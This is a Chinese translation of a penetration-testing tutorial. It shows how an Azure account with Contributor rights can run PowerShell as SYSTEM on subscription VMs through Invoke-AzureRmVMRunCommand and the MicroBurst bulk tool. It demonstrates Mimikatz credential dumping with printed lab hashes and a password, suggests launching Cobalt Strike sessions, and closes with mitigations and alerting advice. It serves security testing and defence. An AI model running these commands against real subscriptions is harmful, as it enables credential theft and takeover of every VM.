## 前言

**假设当前你正在进行某项渗透测试任务，其中Azure基础架构也包含在你的测试范围内，并且你恰好可以访问Azure订阅上一个具有“贡献者（Contributor）”权限的域帐户。虽说在实际场景中，贡献者权限并没有这么容易获取到。但在我的渗透测试工作中，我也经常看到贡献者权限会被分发给一些开发人员。如果你够幸运的话，一些管理员可能会添加域用户组作为订阅的贡献者。或者，我们也可以假设是从低权限用户一步步提升到贡献者帐户的。**

此时，我们可以尝试[收集可用凭据](https://blog.netspi.com/get-azurepasswords/)，[转储配置数据](https://github.com/NetSPI/MicroBurst/blob/master/Get-AzureDomainInfo.ps1)，并尝试进一步的访问订阅中的其他帐户（所有者/域管理员）。出于本文的目的，让我们假设只读选项已被我们用尽，并且我们仍然被某个特权用户所困，该用户不允许我们转向其他订阅（或内部域）。

## 攻击虚拟机

针对虚拟机的攻击，我们可以做一些有影响力的测试并pull down
VHD文件快照，但我想没人会愿意去下载100多GB的磁盘映像。让我们使用现有的工具尝试在VM上执行命令。在本示例环境中，假设没有任何的VM被公开，并且你也没有开放任何防火墙端口包括RDP或其他远程管理协议。

即使没有远程管理协议，我们也可以通过几种不同的方式在Azure环境中执行代码。你可以[使用Azure Automation（自动化）在Azure
VM上运行命令](https://azure.microsoft.com/en-us/blog/azure-automation-run-tasks-on-azure-virtual-machines-without-opening-ports/)，但是本文我们将重点关注[Invoke-AzureRmVMRunComman](https://docs.microsoft.com/en-us/powershell/module/azurerm.compute/invoke-azurermvmruncommand?view=azurermps-6.11.0)命令（AzureRM模块的一部分）。

该命令允许具有“Contributor”权限的任何人，[在订阅中的任何Azure VM上以NT
Authority\System权限运行PowerShell脚本](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command)。

## 运行单个命令

从PowerShell中的AzureRM会话运行此命令，该会话使用Contributor帐户进行身份验证。你可以使用Login-AzureRmAccount命令对Azure进行身份验证。

    
    
    Invoke-AzureRmVMRunCommand -ResourceGroupName VMResourceGroupName -VMName VMName -CommandId RunPowerShellScript -ScriptPath PathToYourScript

 **参数分解：**

> ResourceGroupName – VM资源组
>
> VMName – VM的名称
>
> CommandId – 要在Azure中运行的存储类型的命令。
>
> “RunPowerShellScript”允许我们上传和运行PowerShell脚本。
>
> ScriptPath – 你要运行的PowerShell PS1文件的路径。

你可以使用Get-AzureRmVM命令获取VMName和ResourceGroupName。

    
    
    PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
    
    ResourceGroupName    Name       
    -----------------    ----       
    TESTRESOURCES        Remote-Test

在这个例子中，我在Invoke-Mimikatz.ps1文件的末尾添加了一个额外行（Invoke-Mimikatz），以便在导入后运行该函数。以下是VM上的Invoke-Mimikatz.ps1脚本的运行示例（没有登录真实帐户）。

    
    
    PS C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
    Value[0]        : 
      Code          : ComponentStatus/StdOut/succeeded
      Level         : Info
      DisplayStatus : Provisioning succeeded
      Message       :   .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Feb 16 2015 22:15:28) .## ^ ##.  
     ## / \ ##  /* * *
     ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
      '#####'                                     with 15 modules * * */
     
    mimikatz(powershell) # sekurlsa::logonpasswords
     
    Authentication Id : 0 ; 996 (00000000:000003e4)
    Session           : Service from 0
    User Name         : NetSPI-Test
    Domain            : WORKGROUP
    SID               : S-1-5-20         
            msv :
             [00000003] Primary
             * Username : NetSPI-Test
             * Domain   : WORKGROUP
             * LM       : d0e9aee149655a6075e4540af1f22d3b
             * NTLM     : cc36cf7a8514893efccd332446158b1a
             * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
            tspkg :
             * Username : NetSPI-Test
             * Domain   : WORKGROUP
             * Password : waza1234/ 
    mimikatz(powershell) # exit 
    Bye!   
    Value[1] : Code : ComponentStatus/StdErr/succeeded 
    Level : Info 
    DisplayStatus : Provisioning succeeded 
    Message : 
    Status : Succeeded 
    Capacity : 0 
    Count : 0

## 运行多个命令

我已将Invoke-AzureRmVMBulkCMD添加到了MicroBurst，以允许针对订阅中的多个VM执行脚本。使用该命令，我们可以针对整个订阅，特定资源组或单个主机列表运行命令。

你可以在此处获取到MicroBurst - <https://github.com/NetSPI/MicroBurst>

在我的演示中，我将在我的测试订阅中对所有（5）个VM运行Mimikatz，并将脚本的输出写入到一个日志文件。

    
    
    Import-module MicroBurst.psm1
    
    
    Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
    Executing Mimikatz.ps1 against all (5) VMs in the TestingResources Subscription
    Are you Sure You Want To Proceed: (Y/n):
    VERBOSE: Running .\Mimikatz.ps1 on the Remote-EastUS2 - (10.2.10.4 : 52.179.214.3) virtual machine (1 of 5)
    VERBOSE: Script Status: Succeeded
    VERBOSE: Script output written to Output.txt
    VERBOSE: Script Execution Completed on Remote-EastUS2 - (10.2.10.4 : 52.179.214.3)
    VERBOSE: Script Execution Completed in 99 seconds
    VERBOSE: Running .\Mimikatz.ps1 on the Remote-EAsia - (10.2.9.4 : 65.52.161.96) virtual machine (2 of 5)
    VERBOSE: Script Status: Succeeded
    VERBOSE: Script output written to Output.txt
    VERBOSE: Script Execution Completed on Remote-EAsia - (10.2.9.4 : 65.52.161.96)
    VERBOSE: Script Execution Completed in 99 seconds
    VERBOSE: Running .\Mimikatz.ps1 on the Remote-JapanE - (10.2.12.4 : 13.78.40.185) virtual machine (3 of 5)
    VERBOSE: Script Status: Succeeded
    VERBOSE: Script output written to Output.txt
    VERBOSE: Script Execution Completed on Remote-JapanE - (10.2.12.4 : 13.78.40.185)
    VERBOSE: Script Execution Completed in 69 seconds
    VERBOSE: Running .\Mimikatz.ps1 on the Remote-JapanW - (10.2.13.4 : 40.74.66.153) virtual machine (4 of 5)
    VERBOSE: Script Status: Succeeded
    VERBOSE: Script output written to Output.txt
    VERBOSE: Script Execution Completed on Remote-JapanW - (10.2.13.4 : 40.74.66.153)
    VERBOSE: Script Execution Completed in 69 seconds
    VERBOSE: Running .\Mimikatz.ps1 on the Remote-France - (10.2.11.4 : 40.89.130.206) virtual machine (5 of 5)
    VERBOSE: Script Status: Succeeded
    VERBOSE: Script output written to Output.txt
    VERBOSE: Script Execution Completed on Remote-France - (10.2.11.4 : 40.89.130.206)
    VERBOSE: Script Execution Completed in 98 seconds

![20181204090052.png](https://image.3001.net/images/20181204/1543885306_5c05d1fa92404.png!small)

在5个VM上运行Mimikatz的总时长为7分14秒。单从效率上看并不理想（见下文），但却很实用。由于时间的原因我并没有创建多线程，但如果有人愿意帮我完成，那么欢迎随时向我发送[pull
request](https://github.com/NetSPI/MicroBurst)。

## 其他想法

出于演示目的，我在所有VM上运行了Mimikatz。除此之外，你可能需要考虑其他的PowerShell选项：

Spawn Cobalt Strike，Empire 或 Metasploit sessions

搜索敏感文件

在一个VM上运行域信息收集脚本，并使用输出来定位其他特定VM以执行代码

## 性能问题

注意，以上操作均为在实验环境中完成。如果你选择在现实场景中使用，那么请记住一点：并非所有Azure区域或VM映像都是以相同的方式进行响应的。在我的测试当中我发现某些区域和VM会更适合运行这些命令，而在非美国的Azure区域则出现了命令无法执行使用等问题。

因此，在实际测试使用当中，你可能会遇到各种本文未提及的问题。但在大多数情况下，我对美国地区和标准的Windows Server
2012映像都很满意。在我的测试中，Invoke-Mimikatz.ps1脚本通常需要大约30-60秒才能运行。记住，每次执行都必须将脚本上传到VM。

## 缓解措施及检测

作为管理员应该正确分配所有者和贡献者的权限，因为丢失贡献者权限就相当于拿下所有虚拟机的系统权限。

想要减少贡献者执行这些命令的权限，请为你的贡献者创建一个新角色，并限制用户的Microsoft.Compute/virtualMachines/runCommand/action权限。

另外，你可以留意“Run Command on Virtual Machine”日志条目来发现该问题。你可以为此设置警报，除非Invoke-AzureRmVMRunCommand是VM管理过程中不可或缺的一部分，否则应该很容易被检测到当有人使用这个命令时。

以下设置将在任何人尝试使用该命令（成功或失败）时通知你。你还可以将该警报的范围扩展到订阅中的所有VM。

![alertLogic.png](https://image.3001.net/images/20181204/1543885343_5c05d21f0c7f6.png!small)

最后，如果你对该脚本有任何的疑问或改进建议，欢迎随时通过[MicroBurst
Github页面](https://github.com/NetSPI/MicroBurst)与我们取得联系！

 ** *参考来源：[netspi](https://blog.netspi.com/running-powershell-scripts-on-azure-vms/)，FB小编secist编译，转载请注明来自FreeBuf.COM**

